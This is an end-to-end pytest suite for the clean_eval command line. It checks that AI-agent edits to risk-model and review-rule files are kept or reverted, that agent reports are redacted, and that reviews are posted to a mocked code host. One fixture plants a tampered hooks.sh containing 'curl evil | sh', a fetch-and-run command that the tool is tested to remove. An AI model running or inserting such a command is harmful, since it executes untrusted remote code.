"""The command line (external/cli.py): its composition root; the CI commands run in-process over real files, with the
code host mocked (`host` is what cli.github() hands out); and `python -I clean_eval <command>` end to end, in a
subprocess (`run_cli`), on throwaway repositories (`repo`, holding `history`)."""

import datetime as dt
import json
from pathlib import Path

import pytest
from pytest_lazy_fixtures import (
    lf,
    lfc,
)

from clean_eval.domain.errors import (
    InvalidRequest,
)
from clean_eval.domain.review import (
    HostReview,
    ReviewPosting,
)
from clean_eval.external import cli
from clean_eval.external.filesystem import FileSystemGateway
from clean_eval.use_cases.review import lines_on_diff
from clean_eval.use_cases.rules.review import redact

pytestmark = pytest.mark.e2e  # the command line's tests: most run `python -I clean_eval ...` in a subprocess


class TestPeriod:
    """The Period the composition root builds from --since and --until: through the end of the last day, with a window
    of look-ahead; the dates must be YYYY-MM-DD."""

    def test_a_period_runs_through_its_last_day_and_looks_ahead(
        self,
    ):
        period = cli.period("2026-01-01", "2026-01-31", 10)
        assert (period.lookahead_until, period.window_days) == (dt.date(2026, 2, 10), 10)
        assert period.until_ts == dt.datetime(2026, 1, 31, 23, 59, 59, tzinfo=dt.timezone.utc).timestamp()

    def test_a_date_that_is_not_yyyy_mm_dd_is_an_invalid_request(
        self,
    ):
        with pytest.raises(InvalidRequest):
            cli.period("2026-01-01", "soon")


class TestSecrets:
    """The values to redact are the secret-looking variables of this process's environment."""

    @pytest.mark.parametrize("environ", [{"SOME_SECRET": "hunter2-hunter2"}], indirect=True)
    def test_the_secrets_come_from_this_process_environment(
        self,
        process_env,
    ):
        assert redact("pw hunter2-hunter2", cli.secrets())[0] == "pw [REDACTED]"


class TestFinalizeEvalJudgesTheModelEdit:
    """`finalize --skill retro` keeps the agent's edit of .clean-eval/risk-model.json only with --apply, and only when it
    validates and holds the AUC on a sample large enough to tell; otherwise the file is put back as it was before the
    agent ran (removed when it wasn't there)."""

    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": lf("valid_model_edit")}], indirect=True)
    @pytest.mark.parametrize(
        "agent_files", [{"result.json": {"recommendations": [lf("recommendation")]}}], indirect=True
    )
    def test_a_valid_edit_is_kept(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
        recommendation,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        result = json.loads(
            Path(
                ci_folders.out,
                "result.json",
            ).read_text()
        )
        assert result["model_change"]["accepted"]
        assert result["applied"]
        assert Path(
            ci_folders.ws,
            ".clean-eval",
            "risk-model.json",
        ).exists()
        assert (
            "applied=true"
            in Path(
                ci_folders.gh_output,
            ).read_text()
        )
        assert result["recommendations"] == [recommendation]

    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": lf("structural_model_edit")}], indirect=True)
    def test_a_structural_edit_is_reverted(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        assert not json.loads(
            Path(
                ci_folders.out,
                "result.json",
            ).read_text()
        )["model_change"]["accepted"]
        assert not Path(
            ci_folders.ws,
            ".clean-eval",
            "risk-model.json",
        ).exists()  # it wasn't there

    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": lf("flat_model_edit")}], indirect=True)
    def test_an_edit_that_lowers_the_auc_is_reverted(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        model_change = json.loads(
            Path(
                ci_folders.out,
                "result.json",
            ).read_text()
        )["model_change"]
        assert not model_change["accepted"]
        assert "below" in model_change["reason"]

    @pytest.mark.parametrize("retro_history_prs", [(3, 10)], indirect=True)
    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": lf("valid_model_edit")}], indirect=True)
    def test_an_edit_on_a_small_sample_is_rejected(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        model_change = json.loads(
            Path(
                ci_folders.out,
                "result.json",
            ).read_text()
        )["model_change"]
        assert "sample too small" in model_change["reason"]
        assert not Path(
            ci_folders.ws,
            ".clean-eval",
            "risk-model.json",
        ).exists()

    @pytest.mark.parametrize("retro_history_prs", [(0, 30)], indirect=True)
    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": {"unrated_band": "Low"}}], indirect=True)
    def test_an_edit_with_an_undefined_auc_is_rejected(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        assert not json.loads(
            Path(
                ci_folders.out,
                "result.json",
            ).read_text()
        )["model_change"]["accepted"]
        assert not Path(
            ci_folders.ws,
            ".clean-eval",
            "risk-model.json",
        ).exists()

    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": lf("valid_model_edit")}], indirect=True)
    @pytest.mark.parametrize("finalize_retro_args", [[]], indirect=True)
    def test_without_apply_an_edit_is_rejected(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        assert not Path(
            ci_folders.ws,
            ".clean-eval",
            "risk-model.json",
        ).exists()
        model_change = json.loads(
            Path(
                ci_folders.out,
                "result.json",
            ).read_text()
        )["model_change"]
        assert model_change == {"accepted": False, "reason": "apply=false"}

    @pytest.mark.parametrize("tuning", [{"risk-model.json": lf("earlier_model")}], indirect=True)
    @pytest.mark.parametrize("tuning_edits", [{"risk-model.json": None}], indirect=True)
    def test_removing_the_model_is_judged_like_an_edit(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
        earlier_model,
    ):
        assert (
            cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        )  # back to the defaults would also change `depth`: not allowed
        assert not json.loads(
            Path(
                ci_folders.out,
                "result.json",
            ).read_text()
        )["model_change"]["accepted"]
        model = Path(
            ci_folders.ws,
            ".clean-eval",
            "risk-model.json",
        )
        assert json.loads(model.read_text()) == earlier_model


class TestFinalizeEvalJudgesTheRulesEdit:
    """`finalize --skill retro` keeps the agent's edit of .clean-eval/review-rules.md when its table is valid; removing
    the file, or a table that isn't, is reverted."""

    @pytest.mark.parametrize("tuning", [{"review-rules.md": lf("review_rules")}], indirect=True)
    @pytest.mark.parametrize(
        "tuning_edits",
        [{"review-rules.md": lfc(lambda rules: rules + "| Q-05 | major | High | new rule |\n", lf("review_rules"))}],
        indirect=True,
    )
    def test_a_valid_edit_is_kept(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        assert json.loads(
            Path(
                ci_folders.out,
                "result.json",
            ).read_text()
        )["rules_change"] == {"accepted": True}
        assert (
            "Q-05"
            in Path(
                ci_folders.ws,
                ".clean-eval",
                "review-rules.md",
            ).read_text()
        )

    @pytest.mark.parametrize("tuning", [{"review-rules.md": lf("review_rules")}], indirect=True)
    @pytest.mark.parametrize("tuning_edits", [{"review-rules.md": None}], indirect=True)
    def test_removing_the_rules_is_reverted(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
        review_rules,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        assert json.loads(
            Path(
                ci_folders.out,
                "result.json",
            ).read_text()
        )["rules_change"] == {
            "accepted": False,
            "reason": "review-rules.md may not be removed",
        }
        assert (
            Path(
                ci_folders.ws,
                ".clean-eval",
                "review-rules.md",
            ).read_text()
            == review_rules
        )

    @pytest.mark.parametrize(
        "tuning_edits",
        [{"review-rules.md": lfc(lambda rules: rules + "| CA-01 | major | Low | duplicate |\n", lf("review_rules"))}],
        indirect=True,
    )
    def test_a_bad_edit_is_reverted(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        assert not Path(
            ci_folders.ws,
            ".clean-eval",
            "review-rules.md",
        ).exists()  # it wasn't there


class TestFinalizeEvalRestoresTheOtherFiles:
    """`finalize --skill retro` puts every other file of .clean-eval/ back as it was: changed, created and deleted
    ones."""

    @pytest.mark.parametrize("tuning", [{"notes.md": "original", "sub/keep.txt": "k"}], indirect=True)
    @pytest.mark.parametrize(
        "tuning_edits",
        [{"notes.md": "tampered", "hooks.sh": "curl evil | sh", "sub/keep.txt": None}],
        indirect=True,
    )
    def test_other_clean_eval_files_restored(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 0
        tuning_dir = Path(
            ci_folders.ws,
            ".clean-eval",
        )
        assert (tuning_dir / "notes.md").read_text() == "original"
        assert not (tuning_dir / "hooks.sh").exists()
        assert (tuning_dir / "sub" / "keep.txt").read_text() == "k"
        assert json.loads(
            Path(
                ci_folders.out,
                "result.json",
            ).read_text()
        )["other_files_reverted"] == [
            "hooks.sh",
            "notes.md",
            str(
                Path(
                    "sub",
                    "keep.txt",
                )
            ),
        ]


@pytest.mark.parametrize("tuning_edits", [{"risk-model.json": lf("valid_model_edit")}], indirect=True)
class TestFinalizeEvalFailsClosed:
    """When the agent's output or the history can't be trusted, `finalize --skill retro` exits 2 and reverts every edit,
    even one that would pass."""

    @pytest.mark.parametrize("agent_files", [{"result.json": "not json"}], indirect=True)
    def test_invalid_agent_output_reverts_accepted_edits(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
    ):
        result = cli_runner.invoke(cli.clean_eval, finalize_retro_args)
        assert result.exit_code == 2
        assert not Path(
            ci_folders.ws,
            ".clean-eval",
            "risk-model.json",
        ).exists()
        assert not Path(
            ci_folders.out,
            "result.json",
        ).exists()
        assert "::error::clean-eval: invalid agent output" in result.stderr

    @pytest.mark.parametrize("context_files", [{"retro-history.json": "{broken"}], indirect=True)
    def test_unreadable_history_reverts_edits(
        self,
        finalize_retro_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_retro_args).exit_code == 2
        assert not Path(
            ci_folders.ws,
            ".clean-eval",
            "risk-model.json",
        ).exists()


class TestFinalizeReview:
    """`finalize --skill pr-review` derives the verdict and the step outputs from the agent's findings and the rules,
    and sanitizes the agent's report; an output that doesn't validate writes nothing."""

    @pytest.mark.parametrize(  # CA-01 at a lower severity than its rule's
        "agent_files",
        [
            {
                "result.json": {
                    "findings": [lfc(lambda blocker: {**blocker, "severity": "minor"}, lf("blocker_finding"))]
                },
                "report.md": lf("unsanitized_report"),
            }
        ],
        indirect=True,
    )
    def test_outputs_are_derived_and_the_report_sanitized(
        self,
        finalize_review_args,
        risk_report,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_review_args).exit_code == 0
        assert Path(
            ci_folders.gh_output,
        ).read_text().splitlines() == [
            "verdict=request_changes",  # CA-01 is a blocker, whatever severity the agent gave it
            "max-tier=%s" % risk_report.max_tier,
            "max-score=%d" % risk_report.max_score,
            "blockers=1",
        ]
        report = Path(
            ci_folders.out,
            "report.md",
        ).read_text()
        assert "clean-eval:" not in report
        assert "ghp_" not in report
        assert (
            json.loads(
                Path(
                    ci_folders.out,
                    "result.json",
                ).read_text()
            )["redactions"]
            == 1
        )

    @pytest.mark.parametrize("agent_files", [{"result.json": "[]"}], indirect=True)
    def test_invalid_output_writes_nothing(
        self,
        finalize_review_args,
        cli_runner,
        ci_folders,
    ):
        assert cli_runner.invoke(cli.clean_eval, finalize_review_args).exit_code == 2
        assert not Path(
            ci_folders.out,
            "result.json",
        ).exists()
        assert not Path(
            ci_folders.gh_output,
        ).exists()


@pytest.mark.parametrize("agent_review", [{"findings": [lf("blocker_finding"), lf("unplaced_finding")]}], indirect=True)
class TestPost:
    """`post` puts the validated review up as one review of the PR's head commit, of which the code host takes as much
    as it accepts, logs each attempt, and then dismisses this reviewer's stale change requests; it fails only when
    nothing went up."""

    @pytest.mark.parametrize(
        "host",
        [
            {
                "post_review.return_value": lf("posted_after_a_refusal"),
                "reviews.return_value": lf("reviews_once_posted"),
            }
        ],
        indirect=True,
    )
    def test_the_review_goes_up_and_the_stale_ones_are_dismissed(
        self,
        host,
        post_args,
        risk_report,
        cli_runner,
    ):
        result = cli_runner.invoke(cli.clean_eval, post_args)
        assert result.exit_code == 0
        number, post = host.post_review.call_args.args
        assert (number, post.commit, post.request_changes) == (1, risk_report.head, True)
        assert [comment.line for comment in post.comments] == [3]  # no diff in the context: every line is tried
        assert "clean-eval:pr-review tier=%s" % risk_report.max_tier in post.body
        assert "rules=CA-01,Q-02" in post.body
        assert "score=%d " % risk_report.max_score in post.body  # scores are integers 0-100
        assert "::warning::review post failed (event=REQUEST_CHANGES, inline comments=1): " in result.stderr
        assert "posted review on #1: event=REQUEST_CHANGES, inline comments=0" in result.stdout
        host.dismiss_review.assert_called_once_with(
            1, 10, "Superseded by the clean-eval review of %s" % risk_report.head[:8]
        )

    @pytest.mark.parametrize("host", [{"post_review.return_value": lf("refused_every_time")}], indirect=True)
    def test_a_review_that_never_went_up_fails(
        self,
        host,
        post_args,
        cli_runner,
    ):
        result = cli_runner.invoke(cli.clean_eval, post_args)
        assert result.exit_code == 1
        assert "(the token needs pull-requests: write)" in result.stderr
        host.post_review.assert_called_once()
        host.reviews.assert_not_called()

    @pytest.mark.parametrize(
        "host",
        [
            {
                "post_review.return_value": ReviewPosting(
                    review=HostReview(),
                ),
                "reviews.return_value": [],
            }
        ],
        indirect=True,
    )
    def test_a_review_whose_reply_is_unread_still_went_up(
        self,
        host,
        post_args,
        cli_runner,
    ):
        assert cli_runner.invoke(cli.clean_eval, post_args).exit_code == 0
        host.post_review.assert_called_once()
        host.dismiss_review.assert_not_called()  # without its id and author, no review of the PR is known stale


@pytest.mark.parametrize(
    "agent_review",
    [
        {
            "findings": [
                lfc(lambda blocker: {**blocker, "line": 40}, lf("blocker_finding")),
                lf("unplaced_finding"),
                lfc(lambda blocker: {**blocker, "line": 2, "summary": "on diff"}, lf("blocker_finding")),
            ]
        }
    ],
    indirect=True,
)
@pytest.mark.parametrize("context_files", [lf("prepared_diff")], indirect=True)
@pytest.mark.parametrize(
    "host",
    [
        {
            "post_review.return_value": ReviewPosting(
                review=HostReview(
                    id=5,
                    author="x[bot]",
                ),
            ),
            "reviews.return_value": [],
        }
    ],
    indirect=True,
)
class TestPostOnTheDiff:
    """With the diff in the context, `post` attaches inline only the findings on lines of the diff, where a code host
    takes them, and lists the others in the review's body."""

    def test_only_on_diff_comments_attached(
        self,
        host,
        post_args,
        cli_runner,
        ci_folders,
    ):
        assert lines_on_diff(FileSystemGateway(), ci_folders.ctx) == {"a.py": {1, 2, 3}}
        assert cli_runner.invoke(cli.clean_eval, post_args).exit_code == 0
        host.post_review.assert_called_once()
        post = host.post_review.call_args.args[1]
        assert [comment.line for comment in post.comments] == [2]
        assert "`a.py:40`" in post.body


class TestCommands:
    """The commands of the command line: the README section is the only publishing output, so the old ones are gone."""

    def test_the_usage_lists_the_commands(
        self,
        run_cli,
        tmp_path,
        cli_commands,
    ):
        usage = run_cli("--help", cwd=tmp_path).stdout
        listed = [line.split()[0] for line in usage.split("Commands:\n", 1)[1].splitlines() if line.strip()]
        assert listed == cli_commands
        assert run_cli("-h", cwd=tmp_path).stdout == usage

    @pytest.mark.parametrize("gone", ["render", "diagram"])
    def test_a_removed_command_fails(
        self,
        run_cli,
        tmp_path,
        gone,
    ):
        assert run_cli(gone, "x", cwd=tmp_path).returncode != 0


@pytest.mark.parametrize("history", [lf("billing_history")], indirect=True)
class TestRate:
    """`rate` rates the working tree, or a past revision read from git objects, into data.json; `report` summarizes
    it."""

    def test_rate_and_report(
        self,
        repo,
        run_cli,
        tmp_path,
    ):
        rated = run_cli("rate", "--depth", "2", "--out", str(tmp_path), cwd=repo.path)
        assert rated.returncode == 0, rated.stderr
        data = json.loads((tmp_path / "data.json").read_text())
        assert sorted(module["name"] for module in data["modules"]) == ["src/billing", "src/users"]
        assert "Policy: clean-eval default" in data["notes"]
        report = run_cli("report", str(tmp_path / "data.json"), cwd=repo.path)
        assert "| `src/" in report.stdout

    def test_rate_a_past_revision(
        self,
        repo,
        shas,
        run_cli,
        tmp_path,
    ):
        rated = run_cli("rate", "--rev", shas[0], "--out", str(tmp_path), cwd=repo.path)
        assert rated.returncode == 0, rated.stderr
        assert json.loads((tmp_path / "data.json").read_text())["ref"] == shas[0]


@pytest.mark.parametrize("history", [lf("billing_history")], indirect=True)
class TestAssess:
    """`assess` rates the base of a change and gives the risk of each path it changes."""

    def test_assess_a_change_from_its_base(
        self,
        repo,
        shas,
        run_cli,
    ):
        assessed = run_cli("assess", "--base", shas[0], "--head", shas[1], cwd=repo.path)
        assert assessed.returncode == 0, assessed.stderr
        risk = json.loads(assessed.stdout)
        assert risk["files"]["src/users/api.py"] == "src/users"
        assert risk["ignored"] == ["docs/x.md"]
        modules = {module["module"]: module for module in risk["modules"]}
        assert not modules["infra"]["rated"]
        assert modules["infra"]["band"] == "Moderate"
        assert risk["max_band"] in ("Moderate", "High", "Critical")


@pytest.mark.parametrize("history", [lf("app_with_readme_history")], indirect=True)
class TestReadme:
    """`readme` writes the heat map into the README's section and the diagram once, then leaves them alone while the
    ratings stay the same."""

    def test_readme_is_written_once_then_left_alone(
        self,
        repo,
        run_cli,
        tmp_path,
    ):
        data, status = str(tmp_path / "data.json"), tmp_path / "status.json"
        assert run_cli("rate", "--out", str(tmp_path), cwd=repo.path).returncode == 0
        first = run_cli("readme", data, "--status-json", str(status), cwd=repo.path)
        assert first.returncode == 0, first.stderr
        assert json.loads(status.read_text())["readme_changed"]
        text = Path(
            repo.path,
            "README.md",
        ).read_text()
        assert text.startswith("# App\n\n## Risk Heat Map\n\n<!-- risk-heat-map:start -->")
        assert "](docs/risk-heatmap.svg)" in text
        assert Path(
            repo.path,
            "docs",
            "risk-heatmap.svg",
        ).exists()
        again = run_cli("readme", data, "--status-json", str(status), cwd=repo.path)
        assert "unchanged" in again.stdout
        assert not json.loads(status.read_text())["readme_changed"]


@pytest.mark.parametrize("history", [lf("v1_policy_history")], indirect=True)
class TestAnInvalidPolicy:
    """A repository's risk-model.json that doesn't validate is reported, with a non-zero status, not raised."""

    def test_invalid_policy_is_reported_not_raised(
        self,
        repo,
        run_cli,
        tmp_path,
    ):
        rated = run_cli("rate", "--out", str(tmp_path), cwd=repo.path)
        assert rated.returncode != 0
        assert "v1 model" in rated.stderr
        assert "Traceback" not in rated.stderr


class TestHistoryCommand:
    """The retro skill runs `uv run ... python -I <checkout>/clean_eval history ...` from the repository it evaluates."""

    @pytest.mark.parametrize("history", [lf("fixed_feature_history")], indirect=True)
    def test_replay_and_sensitivity_from_any_folder(
        self,
        repo,
        run_cli,
        tmp_path,
    ):
        collected, candidate = str(tmp_path / "h.json"), tmp_path / "candidate.json"
        res = run_cli("history", "--since", "2026-01-15", "--until", "2026-02-28", "--out", collected, cwd=repo.path)
        assert res.returncode == 0, res.stderr
        assert "2 PRs, 1 with escaped defects" in res.stderr
        candidate.write_text(json.dumps({"business_weights": {"dependents": 0.4}}))
        replayed = run_cli("history", "--from-history", collected, "--replay", str(candidate), cwd=repo.path)
        assert set(json.loads(replayed.stdout)) == {"auc_max_score", "by_band", "band_mix"}
        rows = json.loads(run_cli("history", "--from-history", collected, "--sensitivity", cwd=repo.path).stdout)
        assert rows[0]["change"] == "baseline"

    @pytest.mark.parametrize(
        ("args", "message"),
        [
            (["--sensitivity"], "need --from-history"),
            ([], "--since is required"),
            (["--since", "last week"], "YYYY-MM-DD"),
        ],
        ids=["sensitivity without a history", "no period", "not a date"],
    )
    def test_usage_errors_are_reported_not_raised(
        self,
        repo,
        run_cli,
        args,
        message,
    ):
        res = run_cli("history", *args, cwd=repo.path)
        assert res.returncode != 0
        assert message in res.stderr
        assert "Traceback" not in res.stderr
